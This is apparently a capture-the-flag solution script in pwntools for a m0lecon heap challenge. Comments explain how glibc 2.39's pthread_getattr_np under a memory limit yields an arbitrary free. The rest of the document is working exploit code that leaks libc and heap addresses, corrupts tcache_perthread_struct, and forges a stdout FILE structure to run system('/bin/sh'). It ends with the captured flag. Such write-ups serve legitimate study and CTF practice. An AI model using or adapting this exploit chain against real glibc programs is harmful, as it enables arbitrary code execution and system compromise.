from pwn import *
import resource
# from subprocess import getoutput

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

def rlimit_as():
    soft, hard = resource.getrlimit(resource.RLIMIT_AS)
    soft = 3*1024*1024
    resource.setrlimit(resource.RLIMIT_AS, (soft, hard))

p = process('./yetanotherheapchall_patched', preexec_fn=rlimit_as)
gdb.attach(p, gdbscript='''
    continue
''')

# p = remote('yetanotherheapchall.challs.m0lecon.it', 48810)

# p.recvuntil(b"or\n")
# cmd = p.recvline().strip().decode()
# p.sendlineafter(b"Result: ", getoutput(cmd).encode())

# malloc chunk that must not be on stack at index from 0 to 0xf with size not greater than 0x800 and data
# calling sequence of functions is: pthread_getattr_np, pthread_attr_getstack, malloc, read, pthread_attr_destroy
# arbitrary free is available if a specific realloc fails due to memory limit and iattr->extension->cpuset is overwritten with target, explained in detail later
def create(index, size, data):
    p.sendlineafter(b"> ", b'1')
    p.sendlineafter(b"Index: ", str(index).encode())
    p.sendlineafter(b"Size: ", str(size).encode())
    p.sendafter(b"Data: ", data)

# free chunk at index and set its pointer to null
def delete(index):
    p.sendlineafter(b"> ", b'2')
    p.sendlineafter(b"Idx: ", str(index).encode())

# print out string starting from address of chunk at index
def view(index):
    p.sendlineafter(b"> ", b'3')
    p.sendlineafter(b"Idx: ", str(index).encode())
    return p.recvline().strip()

# entry point of this challenge is that RLIMIT_AS=3 is defined in docker-compose.yml, which means realloc can fail if memory is filled up to limit of 3 megabytes
# key vulnerability of this challenge is within pthread_getattr_np (https://elixir.bootlin.com/glibc/glibc-2.39/source/nptl/pthread_getattr_np.c#L32), which requires subtle heap feng shui to exploit
"""
interaction with heap during pthread_getattr_np:

https://elixir.bootlin.com/glibc/glibc-2.39/source/nptl/pthread_getattr_np.c#L85
__pthread_getattr_np -> _IO_new_fopen -> __fopen_internal -> chunk_0x1e0=malloc(0x1d8)

https://elixir.bootlin.com/glibc/glibc-2.39/source/nptl/pthread_getattr_np.c#L122
__pthread_getattr_np -> __getline -> __getdelim -> chunk_0x80=malloc(0x78)
__pthread_getattr_np -> __getline -> __getdelim -> _IO_new_file_underflow -> __IO_doallocbuf -> chunk_0x410=malloc(0x400)
__pthread_getattr_np -> __getline -> __getdelim -> chunk_0x100=realloc(chunk_0x80, 0xf0) -> free(chunk_0x80)

https://elixir.bootlin.com/glibc/glibc-2.39/source/nptl/pthread_getattr_np.c#L162
__pthread_getattr_np -> free(chunk_0x100)

https://elixir.bootlin.com/glibc/glibc-2.39/source/nptl/pthread_getattr_np.c#L165
__pthread_getattr_np -> _IO_new_fclose -> _IO_new_file_close_it -> __IO_setb -> free(chunk_0x410)
__pthread_getattr_np -> _IO_new_fclose -> _IO_deallocate_file free(chunk_0x1e0)

https://elixir.bootlin.com/glibc/glibc-2.39/source/nptl/pthread_getattr_np.c#L180
__pthread_getattr_np -> chunk_0x30_1=realloc(0, 0x20)

https://elixir.bootlin.com/glibc/glibc-2.39/source/nptl/pthread_getattr_np.c#L194
https://elixir.bootlin.com/glibc/glibc-2.39/source/nptl/pthread_attr_setaffinity.c#L45
https://elixir.bootlin.com/glibc/glibc-2.39/source/nptl/pthread_attr_extension.c#L28
__pthread_getattr_np -> __pthread_attr_setaffinity_np -> __pthread_attr_extension -> chunk_0xa0=calloc(0x98, 1)

https://elixir.bootlin.com/glibc/glibc-2.39/source/nptl/pthread_getattr_np.c#L194
https://elixir.bootlin.com/glibc/glibc-2.39/source/nptl/pthread_attr_setaffinity.c#L51
__pthread_getattr_np -> __pthread_attr_setaffinity_np -> chunk_0x30_2=realloc(0, 0x20) & *chunk_0xa0=chunk_0x30_2

https://elixir.bootlin.com/glibc/glibc-2.39/source/nptl/pthread_getattr_np.c#L198
__pthread_getattr_np -> free(chunk_0x30_1)

https://elixir.bootlin.com/glibc/glibc-2.39/source/nptl/pthread_getattr_np.c#L204
https://elixir.bootlin.com/glibc/glibc-2.39/source/nptl/pthread_attr_destroy.c#L38
__pthread_getattr_np -> __pthread_attr_destroy -> free(*chunk_0xa0) / free(chunk_0x30_2)

https://elixir.bootlin.com/glibc/glibc-2.39/source/nptl/pthread_getattr_np.c#L204
https://elixir.bootlin.com/glibc/glibc-2.39/source/nptl/pthread_attr_destroy.c#L39
__pthread_getattr_np -> __pthread_attr_destroy -> free(chunk_0xa0)

if __pthread_getattr_np -> __pthread_attr_setaffinity_np -> NULL=realloc(0, 0x20) fails due to memory limit,
__pthread_attr_setaffinity_np returns ENOMEM and __pthread_getattr_np calls __pthread_attr_destroy,
leading to __pthread_getattr_np -> __pthread_attr_destroy -> free(0) and __pthread_getattr_np -> __pthread_attr_destroy -> free(chunk_0xa0).

exploitation path of arbitrary free in create:
1. __pthread_getattr_np:
    - fail __pthread_getattr_np -> __pthread_attr_setaffinity_np -> NULL=realloc(0, 0x20) under limit memory
    - trigger __pthread_getattr_np -> __pthread_attr_destroy -> free(NULL)
    - trigger __pthread_getattr_np -> __pthread_attr_destroy -> free(chunk_0xa0)
2. malloc:
    - malloc(0x98)=chunk_0xa0
3. read:
    - *chunk_0xa0=target
4. __pthread_attr_destroy:
    - __pthread_attr_destroy -> free(*chunk_0xa0) / free(target)
    - __pthread_attr_destroy -> free(chunk_0xa0)
"""
# with arbitrary free, exploiting tcache_perthread_struct for FSOP to pop a shell is achievable

glibc_e = ELF('./libc.so.6')

# Stage 1: leak glibc base address and heap base address
create(0, 0x1d8, b'A'*0x68) # heap_base_addr+0x2a0
# a glibc address is already in heap_base_addr+0x2a0+0x68 due to __pthread_getattr_np -> _IO_new_fopen -> __fopen_internal -> chunk_0x1e0=malloc(0x1d8)
glibc_base_addr = u64(view(0)[-6:].ljust(8, b'\x00'))-glibc_e.symbols['_IO_2_1_stderr_']
log.info(f"glibc base address: {hex(glibc_base_addr)}")
create(0, 0x1d8, b'A'*0x88) # heap_base_addr+0xb10
# a heap address is already in heap_base_addr+0xb10+0x88 due to __pthread_getattr_np -> _IO_new_fopen -> __fopen_internal -> chunk_0x1e0=malloc(0x1d8)
heap_base_addr = u64(view(0)[-6:].ljust(8, b'\x00'))-0xbf0
log.info(f"heap base address: {hex(heap_base_addr)}")

# Stage 2: heap feng shui for arbitrary free of tcache_perthread_struct by failing __pthread_getattr_np -> __pthread_attr_setaffinity_np -> NULL=realloc(0, 0x20) under limit memory
# fill tcache bins of size 0xa0 and 0x100
for _ in range(5):
    create(0, 0x1c8, b'A')
# create 9 chunks of size 0x90 for later use
for i in range(9):
    create(i+1, 0x88, b'A')
# exhaust enough memory to leave a top chunk of size 0xc0
for _ in range(189):
    create(0, 0x7f8, b'A')
# clear tcache bin and unsorted bin of size 0xa0
for _ in range(8):
    create(0, 0x98, b'A')
# exhaust a chunk of size 0x100 to leave one available space in tcache bin of size 0x100
create(0, 0xf8, b'A')
# exhaust a chunk of size 0x30 to leave one available chunk in tcache bin of size 0x30
create(0, 0x28, b'A')
# fill tcache bin of size 0x90 and consolidate 2 chunks of size 0x90 to a chunk of size 0x120 in unsorted bin
for i in range(9):
    delete(i+1)
# trigger arbitrary free of tcache_perthread_struct
create(0, 0x98, p64(heap_base_addr+0x10))
# what happened in create critically?
# __pthread_getattr_np -> _IO_new_fopen -> __fopen_internal -> chunk_0x1e0=malloc(0x1d8)
# __pthread_getattr_np -> __getline -> __getdelim -> chunk_0x80=malloc(0x78)
# __pthread_getattr_np -> __getline -> __getdelim -> _IO_new_file_underflow -> __IO_doallocbuf -> chunk_0x410=malloc(0x400)
# __pthread_getattr_np -> __getline -> __getdelim -> chunk_0x100=realloc(chunk_0x80, 0xf0) -> free(chunk_0x80) (retrieve from chunk of size 0x120 in unsorted bin, leave chunk of size 0x20 in unsorted bin)
# __pthread_getattr_np -> free(chunk_0x100) (fill tcache bin of size 0x100)
# __pthread_getattr_np -> _IO_new_fclose -> _IO_new_file_close_it -> __IO_setb -> free(chunk_0x410)
# __pthread_getattr_np -> _IO_new_fclose -> _IO_deallocate_file free(chunk_0x1e0)
# __pthread_getattr_np -> chunk_0x30_1=realloc(0, 0x20) (retrieve from tcache bin of size 0x30, clear tcache bin of size 0x30)
# __pthread_getattr_np -> __pthread_attr_setaffinity_np -> __pthread_attr_extension -> chunk_0xa0=calloc(0x98, 1) (retrieve from top chunk of size 0xc0, leave top chunk of size 0x20)
# __pthread_getattr_np -> __pthread_attr_setaffinity_np -> NULL=realloc(0, 0x20) (fail due to memory limit)
# __pthread_getattr_np -> free(chunk_0x30_1)
# __pthread_getattr_np -> __pthread_attr_destroy -> free(NULL)
# __pthread_getattr_np -> __pthread_attr_destroy -> free(chunk_0xa0) (free into tcache bin of size 0xa0)
# chunk_0xa0=malloc(0x98) (retrieve from tcache bin of size 0xa0, clear tcache bin of size 0xa0)
# read(0, chunk_0xa0, 0x98) (write address of tcache_perthread_struct to first qword of chunk_0xa0)
# __pthread_attr_destroy -> free(&tcache_perthread_struct) (free into tcache bin of size 0x290)
# __pthread_attr_destroy -> free(chunk_0xa0) (free into tcache bin of size 0xa0)

# Stage 3: exploit tcache_perthread_struct for FSOP to pop a shell
# attack tcache_perthread_struct to make next malloc(0xf8) return _IO_2_1_stdout_
class TcachePerthreadStruct:
    def __init__(self):
        self.counts = [0]*64
        self.pointers = [0]*64
    def set_count(self, size, count):
        idx = (size - 0x20) // 16
        self.counts[idx] = count
    def set_pointer(self, size, pointer):
        idx = (size - 0x20) // 16
        self.pointers[idx] = pointer
    def set(self, size, pointer, count=1):
        self.set_pointer(size, pointer)
        self.set_count(size, count)
    def __bytes__(self):
        output = b""
        for count in self.counts:
            output += p16(count)
        for pointer in self.pointers:
            output += p64(pointer)
        return output
fake_tcache = TcachePerthreadStruct()
fake_tcache.set(0x100, glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_'])
create(0, 0x288, bytes(fake_tcache)) # heap_base_addr+0x10
# attack _IO_2_1_stdout_ to trigger FSOP and pop a shell
fake_file = FileStructure(0)
fake_file.flags = 0x3b01010101010101
fake_file._IO_read_end = glibc_base_addr+glibc_e.sym.system
fake_file._IO_write_end = u64(b'/bin/sh\x00')
fake_file._IO_save_base = glibc_base_addr+next(glibc_e.search(asm('add rdi, 0x10; jmp rcx;')))
fake_file._lock = glibc_base_addr+glibc_e.symbols['_IO_stdfile_1_lock']
fake_file._codecvt = glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0xb8
fake_file._wide_data = glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x200
fake_file.unknown2 = p64(0)*2+p64(glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x20)+p64(0)*3
fake_file.vtable = glibc_base_addr+glibc_e.symbols['_IO_wfile_jumps']-0x18
create(0, 0xf8, bytes(fake_file)) # _IO_2_1_stdout_

p.interactive()

# while read line; do echo "$line"; done < flag
# ptm{is_th1s_an_und3f1n3d_beh4v10ur?!?}